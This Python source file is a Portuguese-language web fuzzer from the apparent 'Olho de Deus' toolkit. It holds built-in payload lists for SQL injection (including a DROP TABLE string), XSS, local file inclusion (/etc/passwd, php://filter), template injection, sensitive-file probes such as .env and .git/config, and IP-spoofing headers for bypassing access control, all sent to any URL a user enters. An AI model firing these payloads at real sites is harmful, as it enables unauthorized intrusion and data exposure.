#!/usr/bin/env python3
"""
Web Fuzzer - Fuzzing de parâmetros, headers, cookies
Parte do toolkit Olho de Deus
"""

import os
import sys
import json
import re
import time
import threading
import queue
from typing import List, Dict, Optional, Callable
from dataclasses import dataclass
from urllib.parse import urlparse, urlencode, parse_qs, urljoin
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed


@dataclass
class FuzzResult:
    """Resultado de um teste de fuzzing."""
    payload: str
    url: str
    method: str
    status_code: int
    content_length: int
    response_time: float
    error: bool = False
    error_message: str = ""
    interesting: bool = False
    reflection: bool = False
    headers: Dict = None
    
    def to_dict(self) -> Dict:
        return {
            "payload": self.payload,
            "url": self.url,
            "method": self.method,
            "status_code": self.status_code,
            "content_length": self.content_length,
            "response_time": self.response_time,
            "error": self.error,
            "interesting": self.interesting,
            "reflection": self.reflection
        }


class WordlistManager:
    """Gerenciador de wordlists."""
    
    BUILTIN_WORDLISTS = {
        "common_params": [
            "id", "page", "file", "name", "user", "username", "password",
            "email", "search", "q", "query", "cmd", "exec", "action",
            "url", "redirect", "next", "return", "callback", "data",
            "input", "output", "path", "dir", "folder", "image", "img",
            "document", "doc", "pdf", "download", "upload", "admin",
            "debug", "test", "key", "token", "api", "secret", "config"
        ],
        "sqli_payloads": [
            "'", "\"", "' OR '1'='1", "' OR 1=1--", "1' AND '1'='1",
            "admin'--", "' UNION SELECT NULL--", "' AND SLEEP(5)--",
            "1; DROP TABLE users--", "' OR ''='", "1 OR 1=1"
        ],
        "xss_payloads": [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>", "javascript:alert(1)", "'><script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>", "{{7*7}}", "${7*7}"
        ],
        "lfi_payloads": [
            "../etc/passwd", "....//....//etc/passwd", "/etc/passwd",
            "..\\..\\..\\windows\\win.ini", "php://filter/convert.base64-encode/resource=index.php",
            "php://input", "data://text/plain,<?php phpinfo();?>"
        ],
        "ssti_payloads": [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{7*7}",
            "{{config}}", "{{self}}", "${{7*7}}"
        ],
        "common_dirs": [
            "admin", "administrator", "login", "wp-admin", "dashboard",
            "panel", "api", "v1", "v2", "backup", "backups", "config",
            "db", "database", "dev", "test", "staging", "old", "new"
        ],
        "common_files": [
            "robots.txt", ".htaccess", "web.config", "config.php",
            ".env", ".git/config", "backup.sql", "dump.sql",
            "phpinfo.php", "info.php", "test.php", "admin.php"
        ],
        "headers_fuzz": [
            "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
            "X-Remote-IP", "X-Remote-Addr", "X-Client-IP",
            "X-Custom-IP-Authorization", "X-Original-URL",
            "X-Rewrite-URL", "Content-Type", "Accept"
        ]
    }
    
    @classmethod
    def get_wordlist(cls, name: str) -> List[str]:
        """Obtém wordlist builtin."""
        return cls.BUILTIN_WORDLISTS.get(name, [])
    
    @staticmethod
    def load_from_file(filepath: str) -> List[str]:
        """Carrega wordlist de arquivo."""
        if not os.path.exists(filepath):
            return []
        
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]


class WebFuzzer:
    """Fuzzer principal para aplicações web."""
    
    def __init__(self, threads: int = 10, timeout: int = 10, delay: float = 0):
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.results: List[FuzzResult] = []
        self.stop_flag = False
        self.baseline_response = None
    
    def set_auth(self, auth_type: str, **kwargs):
        """Configura autenticação."""
        if auth_type == "basic":
            self.session.auth = (kwargs.get("username"), kwargs.get("password"))
        elif auth_type == "bearer":
            self.session.headers["Authorization"] = f"Bearer {kwargs.get('token')}"
        elif auth_type == "cookie":
            self.session.cookies.update(kwargs.get("cookies", {}))
        elif auth_type == "header":
            self.session.headers.update(kwargs.get("headers", {}))
    
    def set_cookies(self, cookies: Dict):
        """Define cookies."""
        self.session.cookies.update(cookies)
    
    def set_headers(self, headers: Dict):
        """Define headers customizados."""
        self.session.headers.update(headers)
    
    def _make_request(self, url: str, method: str = "GET", 
                      data: Dict = None, headers: Dict = None) -> FuzzResult:
        """Faz uma requisição HTTP."""
        try:
            start_time = time.time()
            
            if method.upper() == "GET":
                response = self.session.get(url, headers=headers, timeout=self.timeout, allow_redirects=False)
            elif method.upper() == "POST":
                response = self.session.post(url, data=data, headers=headers, timeout=self.timeout, allow_redirects=False)
            elif method.upper() == "PUT":
                response = self.session.put(url, data=data, headers=headers, timeout=self.timeout, allow_redirects=False)
            elif method.upper() == "DELETE":
                response = self.session.delete(url, headers=headers, timeout=self.timeout, allow_redirects=False)
            else:
                response = self.session.request(method, url, data=data, headers=headers, timeout=self.timeout)
            
            elapsed = time.time() - start_time
            
            return FuzzResult(
                payload="",
                url=url,
                method=method,
                status_code=response.status_code,
                content_length=len(response.content),
                response_time=elapsed,
                headers=dict(response.headers)
            )
            
        except requests.exceptions.Timeout:
            return FuzzResult(
                payload="", url=url, method=method,
                status_code=0, content_length=0, response_time=self.timeout,
                error=True, error_message="Timeout"
            )
        except Exception as e:
            return FuzzResult(
                payload="", url=url, method=method,
                status_code=0, content_length=0, response_time=0,
                error=True, error_message=str(e)
            )
    
    def get_baseline(self, url: str, method: str = "GET") -> FuzzResult:
        """Obtém resposta baseline para comparação."""
        self.baseline_response = self._make_request(url, method)
        return self.baseline_response
    
    def is_interesting(self, result: FuzzResult) -> bool:
        """Determina se um resultado é interessante."""
        if result.error:
            return False
        
        if not self.baseline_response:
            # Sem baseline, considera interessante códigos não-padrão
            return result.status_code not in [404, 403, 400]
        
        # Comparar com baseline
        if result.status_code != self.baseline_response.status_code:
            return True
        
        # Diferença significativa no tamanho
        size_diff = abs(result.content_length - self.baseline_response.content_length)
        if size_diff > 100:  # Mais de 100 bytes de diferença
            return True
        
        # Tempo de resposta muito maior (possível time-based injection)
        if result.response_time > self.baseline_response.response_time * 3:
            return True
        
        return False
    
    def fuzz_parameter(self, url: str, param: str, payloads: List[str],
                       method: str = "GET", base_params: Dict = None) -> List[FuzzResult]:
        """Fuzz um parâmetro específico."""
        results = []
        base_params = base_params or {}
        
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        for payload in payloads:
            if self.stop_flag:
                break
            
            params = base_params.copy()
            params[param] = payload
            
            if method.upper() == "GET":
                test_url = f"{base_url}?{urlencode(params)}"
                result = self._make_request(test_url, "GET")
            else:
                result = self._make_request(base_url, method, data=params)
            
            result.payload = payload
            result.interesting = self.is_interesting(result)
            
            results.append(result)
            
            if self.delay > 0:
                time.sleep(self.delay)
        
        return results
    
    def fuzz_parameters_discover(self, url: str, wordlist: List[str] = None,
                                  method: str = "GET") -> List[FuzzResult]:
        """Descobre parâmetros ocultos."""
        if wordlist is None:
            wordlist = WordlistManager.get_wordlist("common_params")
        
        results = []
        
        # Obter baseline
        self.get_baseline(url, method)
        
        for param in wordlist:
            if self.stop_flag:
                break
            
            test_params = {param: "test123"}
            
            if method.upper() == "GET":
                test_url = f"{url}?{urlencode(test_params)}"
                result = self._make_request(test_url, "GET")
            else:
                result = self._make_request(url, method, data=test_params)
            
            result.payload = param
            result.interesting = self.is_interesting(result)
            
            if result.interesting:
                results.append(result)
            
            if self.delay > 0:
                time.sleep(self.delay)
        
        return results
    
    def fuzz_directory(self, base_url: str, wordlist: List[str] = None,
                       extensions: List[str] = None) -> List[FuzzResult]:
        """Fuzz de diretórios e arquivos."""
        if wordlist is None:
            wordlist = WordlistManager.get_wordlist("common_dirs")
        
        if extensions is None:
            extensions = ["", ".php", ".html", ".txt", ".bak"]
        
        results = []
        
        # Normalizar URL
        if not base_url.endswith('/'):
            base_url += '/'
        
        def check_path(path: str) -> FuzzResult:
            test_url = urljoin(base_url, path)
            result = self._make_request(test_url, "GET")
            result.payload = path
            result.interesting = result.status_code in [200, 201, 204, 301, 302, 307, 308, 401, 403]
            return result
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for word in wordlist:
                for ext in extensions:
                    path = f"{word}{ext}"
                    futures.append(executor.submit(check_path, path))
            
            for future in as_completed(futures):
                if self.stop_flag:
                    break
                result = future.result()
                if result.interesting:
                    results.append(result)
        
        return results
    
    def fuzz_headers(self, url: str, header_payloads: Dict[str, List[str]] = None) -> List[FuzzResult]:
        """Fuzz de headers HTTP."""
        results = []
        
        if header_payloads is None:
            # Headers de bypass de IP
            ip_headers = WordlistManager.get_wordlist("headers_fuzz")
            ip_values = ["127.0.0.1", "localhost", "10.0.0.1", "192.168.1.1"]
            header_payloads = {h: ip_values for h in ip_headers}
        
        # Baseline
        self.get_baseline(url)
        
        for header, payloads in header_payloads.items():
            for payload in payloads:
                if self.stop_flag:
                    break
                
                custom_headers = {header: payload}
                result = self._make_request(url, "GET", headers=custom_headers)
                result.payload = f"{header}: {payload}"
                result.interesting = self.is_interesting(result)
                
                if result.interesting:
                    results.append(result)
        
        return results
    
    def fuzz_sqli(self, url: str, param: str, base_params: Dict = None) -> List[FuzzResult]:
        """Teste de SQL Injection."""
        payloads = WordlistManager.get_wordlist("sqli_payloads")
        return self.fuzz_parameter(url, param, payloads, base_params=base_params)
    
    def fuzz_xss(self, url: str, param: str, base_params: Dict = None) -> List[FuzzResult]:
        """Teste de XSS."""
        payloads = WordlistManager.get_wordlist("xss_payloads")
        results = self.fuzz_parameter(url, param, payloads, base_params=base_params)
        
        # Verificar reflexão
        for result in results:
            if result.payload in str(result.headers):
                result.reflection = True
                result.interesting = True
        
        return results
    
    def fuzz_lfi(self, url: str, param: str, base_params: Dict = None) -> List[FuzzResult]:
        """Teste de Local File Inclusion."""
        payloads = WordlistManager.get_wordlist("lfi_payloads")
        return self.fuzz_parameter(url, param, payloads, base_params=base_params)
    
    def fuzz_ssti(self, url: str, param: str, base_params: Dict = None) -> List[FuzzResult]:
        """Teste de Server-Side Template Injection."""
        payloads = WordlistManager.get_wordlist("ssti_payloads")
        return self.fuzz_parameter(url, param, payloads, base_params=base_params)
    
    def scan_all_vulnerabilities(self, url: str, param: str) -> Dict[str, List[FuzzResult]]:
        """Executa todos os testes de vulnerabilidade."""
        return {
            "sqli": self.fuzz_sqli(url, param),
            "xss": self.fuzz_xss(url, param),
            "lfi": self.fuzz_lfi(url, param),
            "ssti": self.fuzz_ssti(url, param)
        }
    
    def export_results(self, results: List[FuzzResult], output_file: str) -> str:
        """Exporta resultados para arquivo."""
        data = [r.to_dict() for r in results]
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        return output_file


def interactive_menu():
    """Menu interativo do Web Fuzzer."""
    fuzzer = WebFuzzer()
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
╔══════════════════════════════════════════════════════════════╗
║              🎯 WEB FUZZER - Olho de Deus                    ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  [1] 🔎 Descobrir Parâmetros Ocultos                         ║
║  [2] 📁 Fuzzing de Diretórios/Arquivos                       ║
║  [3] 💉 Testar SQL Injection                                 ║
║  [4] 🔴 Testar XSS                                           ║
║  [5] 📂 Testar LFI                                           ║
║  [6] 📝 Testar SSTI                                          ║
║  [7] 🎯 Scan Completo de Vulnerabilidades                    ║
║  [8] 🔧 Fuzzing de Headers                                   ║
║  [9] ⚙️  Configurações                                        ║
║                                                              ║
║  [0] Voltar                                                  ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        escolha = input("Opção: ").strip()
        
        if escolha == '0':
            break
        
        elif escolha == '1':
            print("\n=== Descobrir Parâmetros ===")
            url = input("URL base (ex: http://target.com/page): ").strip()
            if not url:
                continue
            
            method = input("Método (GET/POST, default: GET): ").strip().upper() or "GET"
            
            print(f"\nBuscando parâmetros ocultos em {url}...")
            results = fuzzer.fuzz_parameters_discover(url, method=method)
            
            if results:
                print(f"\n✅ {len(results)} parâmetros interessantes encontrados:\n")
                for r in results:
                    print(f"  • {r.payload} -> Status: {r.status_code}, Size: {r.content_length}")
            else:
                print("\nNenhum parâmetro interessante encontrado.")
        
        elif escolha == '2':
            print("\n=== Fuzzing de Diretórios ===")
            url = input("URL base (ex: http://target.com/): ").strip()
            if not url:
                continue
            
            use_custom = input("Usar wordlist customizada? (s/n): ").lower() == 's'
            wordlist = None
            
            if use_custom:
                path = input("Caminho da wordlist: ").strip()
                wordlist = WordlistManager.load_from_file(path)
            
            print(f"\nFuzzing diretórios em {url}...")
            results = fuzzer.fuzz_directory(url, wordlist)
            
            if results:
                print(f"\n✅ {len(results)} caminhos encontrados:\n")
                for r in results:
                    status_icon = {200: "🟢", 301: "🔵", 302: "🔵", 403: "🟠", 401: "🟡"}.get(r.status_code, "⚪")
                    print(f"  {status_icon} [{r.status_code}] {r.payload} (Size: {r.content_length})")
            else:
                print("\nNenhum caminho encontrado.")
        
        elif escolha == '3':
            print("\n=== Teste de SQL Injection ===")
            url = input("URL (ex: http://target.com/page?id=1): ").strip()
            param = input("Parâmetro para testar (ex: id): ").strip()
            
            if not url or not param:
                continue
            
            print(f"\nTestando SQLi no parâmetro '{param}'...")
            results = fuzzer.fuzz_sqli(url, param)
            
            interesting = [r for r in results if r.interesting]
            if interesting:
                print(f"\n⚠️  {len(interesting)} respostas interessantes:\n")
                for r in interesting:
                    print(f"  • Payload: {r.payload}")
                    print(f"    Status: {r.status_code}, Size: {r.content_length}, Time: {r.response_time:.2f}s")
            else:
                print("\nNenhuma vulnerabilidade detectada com payloads básicos.")
        
        elif escolha == '4':
            print("\n=== Teste de XSS ===")
            url = input("URL (ex: http://target.com/search?q=test): ").strip()
            param = input("Parâmetro para testar (ex: q): ").strip()
            
            if not url or not param:
                continue
            
            print(f"\nTestando XSS no parâmetro '{param}'...")
            results = fuzzer.fuzz_xss(url, param)
            
            reflected = [r for r in results if r.reflection]
            interesting = [r for r in results if r.interesting]
            
            if reflected:
                print(f"\n🔴 {len(reflected)} reflexões detectadas (possível XSS):\n")
                for r in reflected:
                    print(f"  • Payload: {r.payload}")
            elif interesting:
                print(f"\n⚠️  {len(interesting)} respostas interessantes.")
            else:
                print("\nNenhuma reflexão detectada.")
        
        elif escolha == '5':
            print("\n=== Teste de LFI ===")
            url = input("URL (ex: http://target.com/page?file=test): ").strip()
            param = input("Parâmetro para testar (ex: file): ").strip()
            
            if not url or not param:
                continue
            
            print(f"\nTestando LFI no parâmetro '{param}'...")
            results = fuzzer.fuzz_lfi(url, param)
            
            interesting = [r for r in results if r.interesting]
            if interesting:
                print(f"\n⚠️  {len(interesting)} respostas interessantes:\n")
                for r in interesting:
                    print(f"  • Payload: {r.payload}")
                    print(f"    Status: {r.status_code}, Size: {r.content_length}")
            else:
                print("\nNenhuma vulnerabilidade detectada.")
        
        elif escolha == '6':
            print("\n=== Teste de SSTI ===")
            url = input("URL (ex: http://target.com/render?template=test): ").strip()
            param = input("Parâmetro para testar (ex: template): ").strip()
            
            if not url or not param:
                continue
            
            print(f"\nTestando SSTI no parâmetro '{param}'...")
            results = fuzzer.fuzz_ssti(url, param)
            
            interesting = [r for r in results if r.interesting]
            if interesting:
                print(f"\n⚠️  {len(interesting)} respostas interessantes:\n")
                for r in interesting:
                    print(f"  • Payload: {r.payload}")
                    print(f"    Status: {r.status_code}, Size: {r.content_length}")
            else:
                print("\nNenhuma vulnerabilidade detectada.")
        
        elif escolha == '7':
            print("\n=== Scan Completo ===")
            url = input("URL (ex: http://target.com/page?id=1): ").strip()
            param = input("Parâmetro para testar: ").strip()
            
            if not url or not param:
                continue
            
            print(f"\nExecutando scan completo no parâmetro '{param}'...\n")
            all_results = fuzzer.scan_all_vulnerabilities(url, param)
            
            for vuln_type, results in all_results.items():
                interesting = [r for r in results if r.interesting]
                if interesting:
                    print(f"  {vuln_type.upper()}: ⚠️  {len(interesting)} respostas interessantes")
                else:
                    print(f"  {vuln_type.upper()}: ✅ OK")
        
        elif escolha == '8':
            print("\n=== Fuzzing de Headers ===")
            url = input("URL: ").strip()
            
            if not url:
                continue
            
            print(f"\nTestando bypass de headers em {url}...")
            results = fuzzer.fuzz_headers(url)
            
            if results:
                print(f"\n⚠️  {len(results)} headers interessantes:\n")
                for r in results:
                    print(f"  • {r.payload}")
                    print(f"    Status: {r.status_code}, Size: {r.content_length}")
            else:
                print("\nNenhum bypass de header encontrado.")
        
        elif escolha == '9':
            print("\n=== Configurações ===")
            print(f"  Threads atuais: {fuzzer.threads}")
            print(f"  Timeout atual: {fuzzer.timeout}s")
            print(f"  Delay atual: {fuzzer.delay}s")
            
            threads = input("\nNovas threads (Enter para manter): ").strip()
            if threads.isdigit():
                fuzzer.threads = int(threads)
            
            timeout = input("Novo timeout (Enter para manter): ").strip()
            if timeout.isdigit():
                fuzzer.timeout = int(timeout)
            
            delay = input("Novo delay entre requests (Enter para manter): ").strip()
            try:
                fuzzer.delay = float(delay) if delay else fuzzer.delay
            except ValueError:
                pass
            
            print("\n✅ Configurações atualizadas!")
        
        input("\nPressione Enter para continuar...")


if __name__ == "__main__":
    interactive_menu()
